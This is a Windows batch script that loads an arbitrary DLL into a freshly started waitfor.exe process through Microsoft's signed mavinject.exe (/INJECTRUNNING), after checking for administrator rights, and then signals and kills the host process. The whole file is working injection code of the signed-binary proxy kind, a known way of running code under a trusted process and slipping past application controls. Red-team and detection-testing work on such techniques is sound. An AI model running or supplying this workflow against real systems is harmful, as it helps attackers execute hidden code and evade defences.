@echo off
setlocal enabledelayedexpansion


set "DLL_PATH=%~1"
if "%DLL_PATH%"=="" (
    echo [!] Error: DLL path is required.
    echo Usage: %0 "C:\Path\To\DllTest.dll" [TimeoutSeconds] [SignalName]
    pause
    exit /b 1
)

set "TIMEOUT_SEC=%~2"
if "%TIMEOUT_SEC%"=="" set "TIMEOUT_SEC=45"

set "SIGNAL_NAME=%~3"
if "%SIGNAL_NAME%"=="" set "SIGNAL_NAME=OptInject%RANDOM%"

:: Paths to utilities (assume System32; adjust if needed)
set "TASKKILL=%SystemRoot%\System32\taskkill.exe"
set "TASKLIST=%SystemRoot%\System32\tasklist.exe"
set "WAITFOR=%SystemRoot%\System32\waitfor.exe"
set "MAVINJECT=%SystemRoot%\System32\mavinject.exe"  :: Update to actual path if in Windows Kits

:: Check if utilities exist
if not exist "%TASKKILL%" (
    echo [!] taskkill.exe not found.
    pause
    exit /b 1
)
if not exist "%TASKLIST%" (
    echo [!] tasklist.exe not found.
    pause
    exit /b 1
)
if not exist "%WAITFOR%" (
    echo [!] waitfor.exe not found.
    pause
    exit /b 1
)
if not exist "%MAVINJECT%" (
    echo [!] mavinject.exe not found. Install Windows SDK.
    pause
    exit /b 1
)

:: Check DLL exists
if not exist "%DLL_PATH%" (
    echo [!] DLL path does not exist: %DLL_PATH%
    pause
    exit /b 1
)

:: Check if .dll extension
set "EXT=%DLL_PATH:~-4%"
if /i not "%EXT%"==".dll" (
    echo [!] File must be .dll: %DLL_PATH%
    pause
    exit /b 1
)

:: Check admin privileges (rudimentary)
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Run as Administrator required.
    pause
    exit /b 1
)

echo [+] Starting DLL Injection Workflow...

:: Phase 2: Cleanup existing waitfor.exe
echo [*] Cleaning up existing waitfor.exe processes...
%TASKKILL% /IM waitfor.exe /F >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Cleanup successful.
) else if %errorlevel% equ 128 (
    echo [i] No existing processes found.
) else (
    echo [!] Cleanup failed with code %errorlevel%.
)

:: Phase 3: Launch waitfor.exe
echo [*] Launching waitfor.exe with signal %SIGNAL_NAME% (timeout: %TIMEOUT_SEC%s)...
start /b "" "%WAITFOR%" /t %TIMEOUT_SEC% %SIGNAL_NAME%

:: Wait briefly for process to start
timeout /t 1 /nobreak >nul

:: Phase 4: Get PID of waitfor.exe
echo [*] Retrieving PID of waitfor.exe...
set "WAITFOR_PID="
for /f "tokens=2" %%a in ('%TASKLIST% /fi "IMAGENAME eq waitfor.exe" /nh 2^>nul') do (
    set "WAITFOR_PID=%%a"
    goto :pid_found
)
:pid_found
if "%WAITFOR_PID%"=="" (
    echo [!] Failed to find waitfor.exe PID.
    pause
    exit /b 1
)
echo [+] waitfor.exe PID: %WAITFOR_PID%

:: Phase 5: Inject DLL
echo [*] Injecting DLL...
"%MAVINJECT%" %WAITFOR_PID% /INJECTRUNNING "%DLL_PATH%" >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] DLL injection completed successfully.
) else (
    echo [!] DLL injection failed with code %errorlevel%.
    pause
    exit /b 1
)

:: Brief wait for injection to stabilize
timeout /t 2 /nobreak >nul

:: Send signal for graceful termination
echo [*] Sending signal %SIGNAL_NAME% to terminate waitfor.exe...
"%WAITFOR%" /si %SIGNAL_NAME% >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Signal sent successfully.
) else (
    echo [!] Signal send failed with code %errorlevel%.
)

:: Brief wait for process to respond
timeout /t 3 /nobreak >nul

:: Phase 6: Final cleanup
echo [*] Terminating target process...
%TASKKILL% /pid %WAITFOR_PID% /f >nul 2>&1

echo [+] Workflow completed successfully.
pause
exit /b 0
